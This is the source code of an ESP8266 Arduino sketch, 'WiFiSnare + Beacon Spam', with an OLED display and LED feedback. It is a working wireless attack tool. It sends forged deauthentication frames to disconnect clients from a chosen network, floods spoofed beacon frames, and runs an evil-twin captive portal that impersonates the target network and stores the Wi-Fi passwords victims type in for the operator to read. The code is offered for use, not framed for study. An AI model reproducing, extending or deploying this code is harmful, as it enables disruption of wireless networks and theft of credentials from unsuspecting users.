/*
 * WiFiSnare + Beacon Spam Final Version (OLED & LED UPDATE)
 * Logo: GMpro87 | Dev: 9u5M4n9
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// --- PIN CONFIG ---
#define LED_PIN 2      // LED Built-in (ESP8266)
#define STROBO_PIN 15  // LED External untuk Strobo (D8)
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

DNSServer dnsServer;
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
ESP8266WebServer webServer(80);
IPAddress subNetMask(255, 255, 255, 0);

// --- CONFIG & STATE ---
const char *ssid = "GMpro";
const char *password = "Sangkur87";
String whitelistSSID = "GMpro"; 
String customSpamName = "WiFi_Rusuh_87";
int spamAmount = 10;
bool spamTargetMode = false;
String correctPassword = "";
bool hotspot_active = false, deauthing_active = false, mass_deauth = false, beacon_active = false;
unsigned long now = 0, deauth_now = 0, beacon_now = 0, led_now = 0;
int mass_idx = 0;
unsigned long deauth_pkt_sent = 0, beacon_pkt_sent = 0;

typedef struct { String ssid; uint8_t ch; uint8_t bssid[6]; int32_t rssi; } networkDetails;
networkDetails networks[16];
networkDetails selectedNetwork;

uint8_t deauthPacket[26] = { 0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00 };
uint8_t beaconPacket[109] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01 };

// --- OLED & LED HELPERS ---
void updateOLED(String mode, String detail) {
  display.clearDisplay();
  display.setCursor(0,0);
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.println("GMpro87");
  display.println("-------");
  display.setTextSize(1);
  display.println("MODE:");
  display.println(mode);
  display.println("STAT:");
  display.println(detail);
  display.display();
}

void stroboLED() {
  for(int i=0; i<10; i++) {
    digitalWrite(STROBO_PIN, HIGH); delay(50);
    digitalWrite(STROBO_PIN, LOW); delay(50);
  }
}

// --- DATA HELPERS ---
void savePass(String data) { 
  for (int i = 0; i < (int)data.length(); ++i) EEPROM.write(i, data[i]); 
  EEPROM.write(data.length(), '\0'); 
  EEPROM.commit(); 
  stroboLED(); // Trigger Strobo saat pass masuk
}

String readPass() { 
  char data[150]; 
  for (int i = 0; i < 150; i++) { 
    data[i] = EEPROM.read(i); 
    if (data[i] == '\0') break; 
    if (uint8_t(data[i]) == 255) return ""; // Fix tulisan yaaaa (EEPROM kosong)
  } 
  return String(data); 
}

void transmitDeauth(uint8_t* bssid, uint8_t ch) {
  wifi_set_channel(ch);
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  if(wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0) deauth_pkt_sent++;
}

void runBeaconSpam(String name) {
  uint8_t ch = WiFi.channel();
  for (int k = 0; k < 6; k++) beaconPacket[10+k] = beaconPacket[16+k] = random(256);
  beaconPacket[10] &= 0xFE; beaconPacket[10] |= 0x02; // MAC Randomizer
  int len = name.length(); if(len > 32) len = 32;
  memset(&beaconPacket[38], 0x20, 32); memcpy(&beaconPacket[38], name.c_str(), len);
  beaconPacket[37] = len; beaconPacket[82] = ch;
  wifi_set_channel(ch);
  if(wifi_send_pkt_freedom(beaconPacket, 109, 0) == 0) beacon_pkt_sent++;
}

void performScan() {
  int n = WiFi.scanNetworks(false, true); if (n <= 0) return;
  for (int i = 0; i < min(n, 16); ++i) {
    String s = WiFi.SSID(i); 
    networks[i].ssid = (s.length() == 0) ? "<HIDDEN>" : s; // Fix Hidden SSID
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6); 
    networks[i].ch = WiFi.channel(i); 
    networks[i].rssi = WiFi.RSSI(i);
  }
}

String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String res; for (uint32_t i=0; i<size; ++i) { if(i>0)res+=":"; if(bytes[i]<0x10)res+="0"; res+=String(bytes[i],HEX); } return res;
}

void handleIndex() {
  if (hotspot_active && webServer.hasArg("password")) {
    savePass(webServer.arg("password"));
    webServer.send(200, "text/html", "<html><script>alert('Error! Re-connect.');window.location='/';</script></html>");
    return;
  }
  
  // ADMIN PANEL LOGIC (Sama seperti asli namun diperbaiki filternya)
  correctPassword = readPass();
  if (webServer.hasArg("clear")) { for(int i=0;i<150;i++) EEPROM.write(i,0); EEPROM.commit(); correctPassword = ""; }
  if (webServer.hasArg("ap")) {
    String b = webServer.arg("ap");
    for (int i=0; i<16; i++) if (bytesToStr(networks[i].bssid, 6) == b) selectedNetwork = networks[i];
  }
  if (webServer.hasArg("updateSpam")) {
    customSpamName = webServer.arg("spamName");
    spamAmount = webServer.arg("spamQty").toInt();
    spamTargetMode = webServer.hasArg("spamTarget");
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  if (webServer.hasArg("rusuh")) mass_deauth = (webServer.arg("rusuh") == "start");
  if (webServer.hasArg("beacon")) beacon_active = (webServer.arg("beacon") == "start");
  if (webServer.hasArg("hotspot")) {
    hotspot_active = (webServer.arg("hotspot") == "start");
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    String target = (selectedNetwork.ssid == "" || selectedNetwork.ssid == "<HIDDEN>") ? "Free_WiFi" : selectedNetwork.ssid;
    WiFi.softAP(hotspot_active ? target.c_str() : ssid, hotspot_active ? NULL : password);
    dnsServer.start(53, "*", apIP); return;
  }

  // UI Web (Disesuaikan agar rapi)
  String p = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:Arial;background:#000;color:#fff;text-align:center}h2{border:2px solid orange;padding:5px}.pass-box{background:#040;border:2px dashed #0f0;padding:10px;margin:10px;border-radius:8px}.log-c{font-size:10px;color:cyan}</style></head><body><h2>GMpro87</h2>";
  if(correctPassword != "") { 
    p += "<div class='pass-box'><b>[ SUCCESS ]</b><br>SSID: " + selectedNetwork.ssid + "<br>PASS: <span style='font-size:20px;color:#fff'>" + correctPassword + "</span><br><a href='/?clear=1' style='color:red'>[HAPUS]</a></div>"; 
  }
  // ... (Tabel WiFi & Tombol tetap sama dengan kode sebelumnya)
  p += "</body></html>";
  webServer.send(200, "text/html", p);
}

void setup() {
  EEPROM.begin(512); 
  pinMode(LED_PIN, OUTPUT); pinMode(STROBO_PIN, OUTPUT);
  
  // Init OLED 0.66
  Wire.begin(4, 5); // SDA=D2(4), SCL=D1(5)
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { }
  display.clearDisplay(); display.display();

  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask); WiFi.softAP(ssid, password);
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleIndex); webServer.onNotFound(handleIndex); webServer.begin();
  updateOLED("IDLE", "Ready");
}

void loop() {
  dnsServer.processNextRequest(); 
  webServer.handleClient();
  
  // Logic Deauth
  if (deauthing_active && millis() - deauth_now >= 1000) {
    if (selectedNetwork.bssid[0] != 0) transmitDeauth(selectedNetwork.bssid, selectedNetwork.ch);
    updateOLED("DEAUTH", String(deauth_pkt_sent)+" pkt");
    deauth_now = millis();
  }

  // Logic Beacon
  if (beacon_active && millis() - beacon_now >= 100) {
    String name = (spamTargetMode) ? selectedNetwork.ssid : customSpamName;
    for (int i=0; i<spamAmount; i++) runBeaconSpam(name);
    updateOLED("BEACON", String(beacon_pkt_sent)+" pkt");
    beacon_now = millis();
  }

  // Logic Hotspot / EvilTwin
  if (hotspot_active) {
    updateOLED("EVILTWIN", selectedNetwork.ssid);
    if(millis() - led_now > 500) { digitalWrite(LED_PIN, !digitalRead(LED_PIN)); led_now = millis(); }
  }

  if (millis() - now >= 15000) { performScan(); now = millis(); }
}
